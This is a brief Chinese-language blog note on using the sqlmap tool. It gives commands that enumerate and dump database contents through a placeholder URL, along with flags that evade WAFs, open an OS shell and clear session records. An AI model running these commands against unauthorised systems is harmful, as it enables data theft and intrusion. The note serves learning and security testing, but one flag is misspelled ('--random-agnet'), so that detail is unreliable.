---
title: SQLmap Note
date: 2024-07-30
categories: [資安]
tags: [note]

description: 基本sqlmap使用方法

published: true #不顯示此文章
---


請參考:[飛飛的SQLmap教學](https://feifei.tw/security-tool-sqlmap/ "https://feifei.tw/security-tool-sqlmap/")
## 基本payload

```
#取得資料庫
sqlmap -u "URL" --dbs

#取得資料表
sqlmap -u "URL" -D 資料庫名稱 --tables

#取得欄位
sqlmap -u "URL" -D 資料庫名稱 -T 資料表名稱 --columns

#取得指定欄位的資料
sqlmap -u "URL" -D 資料庫名稱 -T 資料表名稱 -C 欄位1,欄位2 --dump
```

## 常用參數

```
#自動(選擇預設值)
--batch

# 使用隨機選擇的 HTTP User-Agent 標頭值，用於繞過 WAF
--random-agnet

# 指定後端資料庫類型
# 中間有空格要使用雙引號，如："Microsoft Access"
--dbms "mysql"

#強制使用 SSL/HTTPS
--force-ssl

# 跳過防火牆檢測測試
--skip-waf

# 獲取RCE
--os-shell

#清除復現過程記錄
--flush-session 
```

## 內建腳本

SQLMap 內建了一些腳本來進行更高級的操作和測試。這些腳本可以用來加強 SQL 注入攻擊的效果或是進行更多細緻的操作。
```sh
# 使用 tamper script 來繞過 WAF 
--tamper="tamper_script_name"  
# 列出所有內建腳本 
sqlmap --list-tampers`
```

